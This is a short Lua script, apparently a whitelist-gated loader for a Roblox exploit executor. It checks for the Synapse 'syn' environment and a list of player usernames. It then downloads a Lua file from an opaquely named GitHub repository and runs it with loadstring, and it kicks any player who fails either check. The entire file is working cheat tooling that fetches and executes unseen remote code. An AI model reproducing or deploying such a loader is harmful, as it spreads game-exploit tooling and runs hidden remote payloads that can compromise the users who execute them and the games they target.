_G.whitelist = {
    ["Shadows_Overlord"] = true,
    ["ArticGamerNL"] = true,
    ["Apple_hollyday"] = true,
    ["Code_Leaked"] = true,
    ["RxPoweringModeration"] = true,
    ["SuperAngelo177"] = true,
    ["XxXAmyGamer_GirlXxX"] = true,
    ["Ramon123454321"] = true,
    ["Vip123yesthatsme"] = true,
    ["kinship1234"] = true,
    ["ii_Tow"] = true,
    ["Melinatore"] = true,
    ["Precisionists"] = true
}

if syn then
    if _G.whitelist[game.Players.LocalPlayer.Name] then
          loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/asdiasjiodasj/uihfasdiash/main/asdsdfgdfdfgdfgfasd.lua', true))()
else game.Players.LocalPlayer:Kick("You aren't whitelisted!")
end
else game.Players.LocalPlayer:Kick("it seems like your exploit isn't supported")
end